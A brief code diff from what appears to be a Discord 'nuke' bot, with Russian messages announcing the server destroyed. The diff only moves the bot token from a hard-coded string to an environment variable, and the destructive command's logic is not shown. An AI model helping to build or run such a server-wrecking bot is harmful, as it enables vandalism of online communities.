@@ -43,4 +43,5 @@ async def nuke(ctx):
     print("✅ НЬЮК ЗАВЕРШЁН")
     await ctx.send("**✅ СЕРВЕР УНИЧТОЖЕН**")
 
-bot.run('')  # ВСТАВЬ НОВЫЙ ТОКЕН
+import os
+bot.run(os.environ[''])
